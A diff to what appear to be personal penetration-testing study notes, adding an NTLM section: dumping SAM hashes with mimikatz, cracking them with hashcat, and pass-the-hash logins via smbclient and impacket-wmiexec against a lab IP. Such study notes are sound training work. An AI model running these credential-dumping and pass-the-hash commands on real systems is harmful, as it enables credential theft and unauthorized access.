@@ -47,3 +47,29 @@
 - if some pre-defined module not work, use john directly
 - create new rule to john.conf ``` sudo sh -c 'cat /home/hoidam/Downloads/ssh.rule >> /etc/john/john.conf'```
 - run it ``` john --wordlist=ssh.passwords --rules=sshRules ssh.hash ```
+
+# NTLM v1
+
+## Brute force NTLM (Windows) MUST USE POWERSHELL!!!
+- Target get from window SAM
+- find all users ``` Get-LocalUser ```
+- w/ mimikatz (need access)
+- check oscp cheat sheet for more commands
+- ``` token::elevate ``` esculate to system
+- get all token ``` lsadump::sam ``` & find the user + hash ntlm u want to breach
+- hashcat: ``` hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force ```
+
+## Non-crack way | Pass NTLM to another service
+### SMB server 
+- sometimes smb server 1 same passwod = server 2, then it works w/ using same NTLM-hash
+
+
+### leveragable tools w/ hash
+1. smbclient
+   - ``` smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b ```
+2. CrackMapExec
+3. impacket_
+4. psexec.py (shell with system identity)
+5. wmiexec.py (shell with admin identity)
+   - rmb add 32 zeros before the hash 
+   - ``` impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212 ```
